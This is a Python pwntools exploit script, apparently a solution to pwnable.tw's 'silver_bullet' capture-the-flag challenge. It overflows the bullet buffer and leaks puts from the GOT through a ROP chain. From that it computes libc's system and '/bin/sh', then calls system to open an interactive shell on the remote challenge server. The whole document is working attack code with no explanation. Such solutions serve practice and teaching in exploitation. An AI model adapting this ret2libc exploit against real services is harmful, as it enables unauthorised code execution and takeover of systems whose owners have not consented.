from pwn import*
import argparse
context(arch='i386',os='linux')
context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument('-r','--remote',action='store_true',help='-r -> remote')
parser.add_argument('-v','--local_1' , action='store_true',help='-v -> tmux_mode')
parser.add_argument('-a','--no_attach',action='store_true',help='-a -> no_attach')

args = parser.parse_args()

host = 'chall.pwnable.tw'
port = 10103

elf = ELF('./silver_bullet')
breakpoint = {'power_up':0x080489c2}

pop_ebx = 0x08048475
main = 0x08048954

def info_log():
    log.info('create_bullet : main + 96')
    log.info('power_up : main + 110')
    log.info('beat : main + 128')

def create(content):
    r.sendlineafter('choice :','1')
    r.sendlineafter('bullet :',str(content))

def power(content):
    r.sendlineafter('choice :','2')
    r.sendlineafter('bullet :',str(content))

def beat():
    r.sendlineafter('choice :','3')

def exit():
    r.sendlineafter('choice:','4')

def exploit():
    info_log()

    payload = 'A'*47
    create(payload)

    power('B')

    payload = 'A'*7
    payload += p32(elf.plt['puts'])
    payload += p32(pop_ebx)
    payload += p32(elf.got['puts'])
    payload += p32(main)

    power(payload)

    beat()
    beat()

    r.recvuntil('Oh ! You win !!\n')
    leak = u32(r.recv(4))

    log.info('leak = '+hex(leak))

    libc_base = leak - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    binsh = libc_base + list(libc.search('/bin/sh'))[0]

    log.info('libc_base = '+hex(libc_base))
    log.info('system = '+hex(system))
    log.info('binsh = '+hex(binsh))

    payload = 'A'*47
    create(payload)

    power('D')

    payload = 'A'*7
    payload += p32(system)
    payload += 'AAAA'
    payload += p32(binsh)

    power(payload)

    beat()
    beat()

    r.interactive()

if args.remote:
    r = remote(host,port)
    libc = ELF('./libc_32.so.6')
    exploit()

elif args.no_attach:
    r = process('./silver_bullet')
    libc = elf.libc

    exploit()

elif args.local_1:
    context.terminal=['tmux','splitw','-v']
    r = process('./silver_bullet')
    libc = elf.libc
    
    gdb.attach(r, 'b*{}'.format(breakpoint['power_up']))
    exploit()

else:
    context.terminal=['tmux','splitw','-h']
    r = process('./silver_bullet')
    libc = elf.libc
    gdb.attach(r,'b*{}'.format(breakpoint['power_up']))
    exploit()
